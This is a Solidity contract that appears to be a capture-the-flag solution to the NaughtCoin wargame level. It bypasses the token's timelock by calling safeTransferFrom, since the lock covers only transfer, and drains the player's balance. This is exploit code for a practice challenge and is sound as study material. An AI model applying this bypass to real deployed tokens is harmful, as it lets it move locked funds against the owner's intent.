// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/token/ERC20/SafeERC20.sol';
import './NaughtCoin.sol';

 contract NaughtCoinSolved {
  using SafeERC20 for NaughtCoin;

  address public player;
  NaughtCoin public naughtCoin;

  constructor(address _player, address _naughtCoin) public {
    player = _player;
    naughtCoin = NaughtCoin(_naughtCoin);
  }
  
  // the lock is only applied on the transfer function and not transferFrom function 
  function emptyPlayer() public {

    uint256 bal = naughtCoin.balanceOf(player);
    naughtCoin.safeTransferFrom(player, address(this), bal);
  }

} 